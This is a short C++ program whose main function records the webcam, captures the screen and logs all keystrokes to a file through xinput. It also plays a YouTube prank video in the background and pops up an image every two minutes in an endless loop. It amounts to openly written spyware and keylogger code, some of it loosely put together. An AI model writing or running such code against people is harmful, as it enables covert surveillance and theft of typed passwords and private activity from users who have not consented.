#include <iostream>
#include <thread> // Include the thread library for running tasks in the background
#include <chrono> // Include the chrono library for the sleep function

int main() {
  // Capture audio and video from the webcam
  std::system("ffmpeg -f v4l2 -i /dev/video0 -t 30 -vcodec libx264 -acodec pcm_s16le output.mp4");

  // Capture the screen
  std::system("ffmpeg -f x11grab -s 1920x1080 -i :0.0 -vcodec libx264 -acodec pcm_s16le screen.mp4");

  // Capture keystrokes
  std::system("xinput test $(xinput | grep -i 'keyboard' | grep -o 'id=[0-9]*' | grep -o '[0-9]*') > keystrokes.txt");

  // Play music from YouTube in the background
  std::thread t1([](){
    std::system("mpv https://www.youtube.com/watch?v=dQw4w9WgXcQ &");
  });

  // Display images in a pop-up window every 2 minutes
  while (true) {
    std::system("eog image.jpg &");
    std::this_thread::sleep_for(std::chrono::seconds(120));
  }

  return 0;
}
